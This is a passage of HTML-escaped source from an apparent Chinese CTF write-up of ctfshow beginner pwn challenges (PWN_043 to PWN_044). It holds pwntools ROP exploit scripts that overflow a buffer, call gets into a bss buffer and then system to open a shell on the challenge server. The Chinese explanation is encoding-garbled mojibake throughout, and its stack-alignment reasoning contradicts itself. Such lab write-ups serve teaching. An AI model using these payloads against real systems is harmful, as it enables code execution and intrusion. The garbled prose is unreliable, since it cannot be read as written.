&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œæœ‰ä¸ªç–‘é—®ç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨buf2å†…å­˜å˜é‡å‘¢ï¼Ÿæˆ‘ç›´æ¥è°ƒç”¨systemå‡½æ•°åå†æ³¨å…¥/bin/shä¸å°±å¥½äº†å—ï¼Ÿè¿™æ˜¾ç„¶ä¸è¡Œï¼Œå› ä¸ºæ­¤æ—¶çš„/bin/shæ˜¯ä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰åˆ†é…åœ°å€ï¼Œå¯æ‰§è¡Œç¨‹åºçš„PIEå’ŒASLRä¿æŠ¤æœºåˆ¶ä¼šè®©å¸ƒå±€å‘ç”ŸéšæœºåŒ–æ”¹å˜ï¼Œä½ ç»™çš„å­—ç¬¦ä¸²æ²¡åœ°å€ï¼Œè€Œsystemå‡½æ•°éœ€è¦æ¥å—åœ°å€æ‰èƒ½æ‰§è¡Œï¼Œè€Œéç›´æ¥æ³¨å…¥æ— åœ°å€çš„çº¯å­—ç¬¦ä¸²ï¼Œbuf2æ˜¯bsså­—æ®µçš„å…¨å±€å˜é‡ï¼Œåœ°å€å›ºå®šï¼Œèƒ½ç»™/bin/shä¸€ä¸ªå›ºå®šåœ°å€ï¼Œè®©systemç²¾å‡†æ‰¾åˆ°å®ƒå¹¶æ‰§è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_044&#34;&gt;PWN_044
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡&amp;quot;/bin/sh&amp;quot; ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_044&#34; &gt;PWN_044&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDAåˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136.png&#34;
	width=&#34;855&#34;
	height=&#34;194&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136_hu_ad575c4dd168699f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136_hu_f6ed3a0acf42320a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;440&#34;
		data-flex-basis=&#34;1057px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137.png&#34;
	width=&#34;671&#34;
	height=&#34;175&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137_hu_deb54602fe7918b8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137_hu_19200459f04ccefb.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;getså‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;383&#34;
		data-flex-basis=&#34;920px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138.png&#34;
	width=&#34;869&#34;
	height=&#34;140&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138_hu_176d74d6a11854a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138_hu_3cd2788b29cb94c5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;bsså­—æ®µä¸Šçš„buf2å˜é‡&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;620&#34;
		data-flex-basis=&#34;1489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å’Œä¸Šä¸€é¢˜åŒºåˆ«æ˜¯å‚æ•°ä¼ é€’ï¼Œ64ä½çš„å‰6å‚æ•°æ˜¯é å¯„å­˜å™¨rdiä¼ é€’çš„ã€‚æŸ¥è¯¢&lt;code&gt;pop rdiï¼›ret&lt;/code&gt;æ±‡ç¼–å‘½ä»¤çš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139.png&#34;
	width=&#34;1478&#34;
	height=&#34;361&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139_hu_1875753dd456a7b6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139_hu_56ce53ca262cfd73.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;409&#34;
		data-flex-basis=&#34;982px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;pop rdi ; retï¼š0x4007f3&lt;/p&gt;
&lt;p&gt;retï¼š0x4004fe&lt;/p&gt;
&lt;p&gt;é‚£expå¤§è‡´ä¸å˜ï¼Œä¸»è¦æ˜¯payloadå§ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¯ä»¥å‘ç°è¿™æ˜¯é”™è¯¯çš„ï¼Œè¿›å…¥ä¸äº†äº¤äº’ï¼Œé”™å°±é”™åœ¨retï¼Œè¿™é‡Œä¸éœ€è¦è¿›è¡Œæ‰‹åŠ¨è°ƒæ ˆå †å¹³è¡¡ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;gets&lt;/code&gt; æ‰§è¡Œå®Œåçš„æ€»åç§»æ˜¯ 44 å­—èŠ‚ï¼ˆ36+8ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;åç»­æ‰§è¡Œ &lt;code&gt;pop_rdi&lt;/code&gt;ï¼ˆ8 å­—èŠ‚ï¼‰+ &lt;code&gt;buf2&lt;/code&gt; åœ°å€ï¼ˆ8 å­—èŠ‚ï¼‰åï¼Œæ€»åç§»å˜ä¸º 44+8+8=60 å­—èŠ‚ã€‚&lt;/p&gt;
&lt;p&gt;60 å­—èŠ‚ Ã· 16 å­—èŠ‚ = 3 ä½™ 12ï¼Ÿä¸å¯¹ â€”â€” æ­¤æ—¶è°ƒç”¨ &lt;code&gt;system&lt;/code&gt; å‰ï¼Œ&lt;code&gt;rsp&lt;/code&gt; æŒ‡å‘ &lt;code&gt;system&lt;/code&gt; å‡½æ•°çš„åœ°å€ï¼Œè€Œ &lt;code&gt;60 + 8&lt;/code&gt;ï¼ˆ&lt;code&gt;system&lt;/code&gt; åœ°å€æœ¬èº«ï¼‰= 68 å­—èŠ‚ï¼Œ68 Ã· 16 = 4 ä½™ 4ï¼Ÿè¿™æ˜¾ç„¶ä¸å¯¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ­£ç¡®ç†è§£&lt;/strong&gt;ï¼šä¸ç”¨çº ç»“é™æ€æ•°å­—ï¼Œè€Œæ˜¯è¦çœ‹åˆ° &lt;code&gt;gets&lt;/code&gt; çš„æ‰§è¡Œå¼•å…¥äº†ä¸€æ¬¡ â€œé¢å¤–çš„æ ˆå¼¹å‡ºâ€ï¼ˆ8 å­—èŠ‚ï¼‰ï¼Œæ°å¥½æŠµæ¶ˆäº†éƒ¨åˆ†åç§»çš„ â€œéå¯¹é½é‡â€ï¼Œä½¿å¾—æœ€ç»ˆè°ƒç”¨ &lt;code&gt;system&lt;/code&gt; æ—¶ï¼Œ&lt;code&gt;rsp&lt;/code&gt; åˆšå¥½è½åœ¨ 16 å­—èŠ‚å¯¹é½çš„åœ°å€ä¸Š â€”â€” è¿™æ˜¯&lt;em&gt;åŠ¨æ€æ‰§è¡Œ&lt;/em&gt;ä¸­æ ˆè‡ªç„¶è°ƒæ•´çš„ç»“æœï¼Œè€Œéé™æ€è®¡ç®—çš„æ€»å’Œã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;åœ¨ 64 ä½ PWN é¢˜ä¸­ï¼Œâ€œåŠ¨æ€å¯¹é½â€ æ˜¯å¦éœ€è¦åŠ  &lt;code&gt;ret&lt;/code&gt;ï¼Œæ ¸å¿ƒçœ‹ &lt;strong&gt;â€œä¸­é—´æ˜¯å¦æœ‰å‡½æ•°æ‰§è¡Œå¹¶è‡ªåŠ¨è°ƒæ•´æ ˆæŒ‡é’ˆâ€&lt;/strong&gt;ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æ­£ç¡®çš„expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28244&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4007f3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;buf2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_045&#34;&gt;PWN_045
